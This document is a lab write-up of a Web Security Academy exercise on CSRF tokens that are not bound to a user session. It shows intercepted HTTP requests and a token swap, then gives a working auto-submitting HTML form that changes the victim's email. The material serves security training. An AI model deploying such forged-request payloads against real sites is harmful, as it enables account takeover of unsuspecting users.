# CSRF Where Token Is Not Tied to User Session

![Difficulty](https://img.shields.io/badge/Difficulty-PRACTITIONER-orange) ![Category](https://img.shields.io/badge/Category-CSRF-blue)

## Objective

> The app uses CSRF tokens but doesn't tie them to a specific user session. Goal is to exploit this to change the victim's email using a valid token from a different account.

## Steps

### 1. Log in as wiener and intercept the email change request

Capture the request and note the CSRF token.

```http
POST /my-account/change-email HTTP/2
Host: 0ad3004603cf60ad82f2fd220030008d.web-security-academy.net
Cookie: session=fKpNtvRJ4v9yMDj6Zb7dP3oPTh2VYYix
Content-Type: application/x-www-form-urlencoded

email=ahmed1%40gmail.com&csrf=giX40GhKS8Ku5Pa67eygtitoidp4xkFb
```

### 2. Drop the request — don't use the token yet

Important: drop this request so wiener's token stays unused and valid.

### 3. Log in as carlos and intercept his email change request

```http
POST /my-account/change-email HTTP/2
Host: 0ad3004603cf60ad82f2fd220030008d.web-security-academy.net
Cookie: session=LELZs4VtopQoRLW3YTN0guamJxsA6pY9
Content-Type: application/x-www-form-urlencoded

email=sdfsdf%40gmail.com&csrf=hdGWCM4yA4WEgqASWv1CuXeCIPHOBG9A
```

### 4. Replace carlos's token with wiener's token and forward

Swap `hdGWCM4yA4WEgqASWv1CuXeCIPHOBG9A` with `giX40GhKS8Ku5Pa67eygtitoidp4xkFb` — the request goes through. The app accepted a token that belongs to a completely different user session, which confirms the vulnerability.

### 5. Build the PoC using carlos's unused token

Since wiener's token got consumed in the test, grab carlos's token (`hdGWCM4yA4WEgqASWv1CuXeCIPHOBG9A`) — it's still unused — and use it in the PoC.

## PoC

```html
<html>
  <body>
    <form action="https://0ad3004603cf60ad82f2fd220030008d.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="sdfsd11f@gmail.com" />
      <input type="hidden" name="csrf" value="hdGWCM4yA4WEgqASWv1CuXeCIPHOBG9A" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```

## Why It Works

The app validates that a CSRF token exists and is valid, but never checks if it belongs to the current session. This means any valid token — even from a completely different user — will pass the check, making the protection useless.

## Key Takeaways

- CSRF tokens must be tied to the user's session, not just exist in a global pool
- Always drop the request when testing a token so it stays unused for the PoC
- Two accounts make this class of vulnerability easy to confirm and exploit
